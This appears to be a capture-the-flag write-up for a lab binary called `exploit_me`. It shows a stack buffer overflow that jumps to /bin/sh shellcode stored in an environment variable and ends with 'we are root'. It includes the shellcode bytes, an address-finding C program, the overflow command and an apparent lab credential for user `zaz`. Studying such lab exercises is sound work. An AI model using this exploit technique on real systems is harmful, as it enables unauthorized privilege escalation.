starting from the writeup1 when we are connected to `zaz` user with `646da671ca01bb5d84dbb5fb2238dc8e`.

there is a different attack we can use on the buffer overflow on the `exploit_me` binary.
instead of using a `ret2libc` attack with system, we can use a shellcode stored in a environment variable.
we will put a shellcode (assembly instructions in hex format, the kind used by any program when loaded in memory) in a environment variable, and redirect the main's return address to the environment variable's address.

shellcode found on https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/.
`export code=$(python -c "print('\x90'*8 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80')")`
a simple C program to get the address of the environment variable:

```c
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv) { printf("%p\n", getenv(argv[1])); }
```

`gcc main.c && ./a.out code`: `0xbfffff4b`

we know from the previous writeup that the buffer is 140 bytes long:

```shell
./exploit_me $(python -c 'print "i"*140 + "\x4b\xff\xff\xbf"')
```

and we are root !
